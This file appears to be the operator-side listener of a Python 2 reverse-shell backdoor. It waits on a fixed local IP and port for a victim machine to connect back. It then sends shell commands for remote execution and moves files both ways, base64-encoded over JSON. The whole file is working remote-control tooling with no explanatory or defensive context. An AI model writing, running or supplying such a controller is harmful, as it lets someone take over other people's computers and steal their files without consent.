#!user/bin/env

import socket
import json
import base64

class Listener:

    def __init__(self, ip, port, backlogs):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(backlogs)
        print("[+] Waiting for incoming connections ...")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def exec_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_recv()

    def write_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            file.close()
        return "[+] Download Succesfull !!!"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            try:
                command = raw_input("\n>>>  ")
                command = command.split(" ")
                if command[0] == "exit":
                    self.reliable_send(command)
                    exit()
                elif command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.exec_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

            except Exception as e:
                result = "[-] Error : " + str(e)
            print(result)


listener = Listener("192.168.43.138", 444, 0)
listener.run()
